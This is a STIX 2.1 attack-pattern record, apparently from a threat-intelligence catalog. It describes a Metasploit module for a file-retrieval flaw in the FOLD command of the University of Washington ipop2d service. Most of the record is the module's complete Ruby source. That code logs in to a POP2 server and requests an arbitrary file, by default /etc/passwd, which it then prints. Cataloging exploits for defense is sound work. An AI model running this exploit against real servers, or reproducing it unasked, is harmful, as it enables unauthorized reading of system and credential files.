{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a494183b-09aa-481a-ac18-435277c78260",
    "created": "2024-08-14T16:22:57.169691Z",
    "modified": "2024-08-14T16:22:57.169695Z",
    "name": "UoW pop2d Remote File Retrieval Vulnerability",
    "description": " This module exploits a vulnerability in the FOLD command of the University of Washington ipop2d service. By specifying an arbitrary folder name it is possible to retrieve any file which is world or group readable by the user ID of the POP account. This vulnerability can only be exploited with a valid username and password. The From address is the file owner. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/pop2/uw_fileretrieval.rb",
            "external_id": "uw_fileretrieval.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Pop2\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UoW pop2d Remote File Retrieval Vulnerability',\n      'Description'    => %q{\n        This module exploits a vulnerability in the FOLD command of the\n        University of Washington ipop2d service. By specifying an arbitrary\n        folder name it is possible to retrieve any file which is world or group\n        readable by the user ID of the POP account. This vulnerability can only\n        be exploited with a valid username and password. The From address is\n        the file owner.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '368' ],\n          [ 'BID', '1484' ],\n        ],\n      'DisclosureDate' => '2000-07-14'))\n\n    register_options(\n      [\n        OptString.new('FILE', [ true, \"The file to retrieve\", '/etc/passwd' ])\n      ])\n  end\n\n  def run\n    connect_login\n    file = datastore['FILE']\n    res = send_cmd( ['FOLD', file] , true)\n\n    if (res =~ /#1 messages in/)\n      send_cmd( ['READ 1'] , true)\n      file_output = send_cmd( ['RETR'] , true)\n      print_status(\"File output:\\r\\n\\r\\n#{file_output}\\r\\n\")\n      send_cmd( ['ACKS'] , true)\n    elsif (res =~ /#0 messages in/)\n      print_status(\"File #{file} not found or read-access is denied.\")\n    end\n\n    send_cmd( ['QUIT'] , true)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-07-14"
}